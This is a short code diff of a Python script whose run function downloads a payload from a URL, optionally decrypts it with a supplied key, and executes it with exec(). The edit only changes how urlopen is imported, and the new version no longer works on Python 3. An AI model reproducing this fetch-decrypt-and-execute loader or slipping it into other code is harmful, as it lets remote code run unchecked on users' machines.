@@ -7,10 +7,7 @@ import os
 import sys
 import struct
 import base64
-if sys.version_info[0] > 2:
-    from urllib.request import urlopen
-else:
-    from urllib import urlopen
+import urllib
 
 try:
     raw_input          # Python 2
@@ -51,5 +48,5 @@ def run(url=None, key=None):
                     sys.exit(0)
             else:
                 sys.exit(0)
-        payload = decrypt(urlopen(url).read(), base64.b64decode(key)) if key else urlopen(url).read()
+        payload = decrypt(urllib.urlopen(url).read(), base64.b64decode(key)) if key else urllib.urlopen(url).read()
         exec(payload, globals())
